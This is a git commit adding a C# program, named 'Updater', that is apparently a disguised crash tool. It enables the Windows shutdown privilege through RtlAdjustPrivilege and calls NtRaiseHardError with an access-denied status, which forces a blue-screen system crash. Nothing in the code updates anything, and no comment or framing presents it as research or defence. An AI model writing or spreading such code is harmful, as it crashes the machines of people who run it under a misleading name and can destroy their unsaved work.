12f2d969687b53418bd4e637412e4976c6bdb60d
YungSamzy <61764480+YungSamzy@users.noreply.github.com>
2023-05-25 14:16:46 -0500

    upload

---
+++ Program.cs
@@ -0,0 +1,23 @@
+﻿using System;
+using System.Runtime.InteropServices;
+
+namespace Updater
+{
+    internal class Program
+    {
+        [DllImport("ntdll.dll")]
+        private static extern uint NtRaiseHardError(int ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
+
+        [DllImport("ntdll.dll")]
+        private static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
+
+        static void Main(string[] args)
+        {
+            var i = 0xC0000022;
+            bool t1;
+            uint t2;
+            RtlAdjustPrivilege(19, true, false, out t1);
+            NtRaiseHardError((int)i, 0, 0, IntPtr.Zero, 6, out t2);
+        }
+    }
+}
